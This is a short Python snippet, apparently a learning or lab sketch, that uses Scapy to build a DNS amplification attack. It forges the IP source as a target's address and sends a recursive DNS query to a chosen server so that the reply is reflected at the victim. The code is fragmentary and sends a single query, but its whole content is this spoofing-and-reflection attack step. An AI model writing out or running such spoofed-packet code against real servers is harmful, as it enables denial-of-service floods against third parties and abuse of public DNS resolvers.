#Address: ans.an[0].rdata
from scapy.all import *


def dns_amplification(dns_server_address, target_address):
    # source is spoofed target address
    ip_info = IP(src=target_address, dst=dns_server_address)
    ans = sr1(ip_info/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname="snl.no",qtype="A")))
    
 